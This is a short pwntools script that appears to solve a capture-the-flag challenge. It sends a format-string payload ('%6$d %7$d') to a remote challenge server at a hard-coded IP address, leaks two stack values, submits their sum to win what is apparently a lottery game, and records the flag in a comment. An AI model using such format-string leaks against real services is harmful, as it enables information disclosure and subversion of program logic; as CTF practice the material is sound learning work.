from pwn import *

r = remote('128.199.234.122', 4200)
r.recv()
r.send('%6$d %7$d\n')
s = r.recvuntil(b':').split(b'\n')[0].split(b' ')
s1, s2 = int(s[1]), int(s[2])
r.send(str(s1+s2)+'\n')
r.recv()
print(r.recv().decode())

#efiensctf{ULTRA_MEGA_SUPER_HUGE_VIETLOT_JACKPOT}

